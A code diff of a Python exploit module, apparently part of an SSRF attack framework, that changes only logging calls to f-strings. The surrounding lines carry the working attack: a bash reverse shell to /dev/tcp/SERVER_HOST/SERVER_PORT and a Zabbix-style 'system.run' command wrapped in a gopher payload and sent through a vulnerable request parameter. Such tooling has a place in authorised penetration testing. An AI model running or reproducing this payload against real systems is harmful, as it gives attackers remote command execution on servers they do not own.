@@ -14,7 +14,7 @@ class exploit():
     cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         cmd = input("Give command to execute (Enter for Reverse Shell): ")
         if cmd == "":
@@ -41,7 +41,7 @@ class exploit():
             data = "system.run[(" + self.cmd + ");sleep 2s]"
             
             payload = wrapper_gopher(data, ip , port)
-            logging.info("Generated payload : {}".format(payload))
+            logging.info(f"Generated payload : {payload}")
 
             # Send the payload
             r = requester.do_request(args.param, payload)
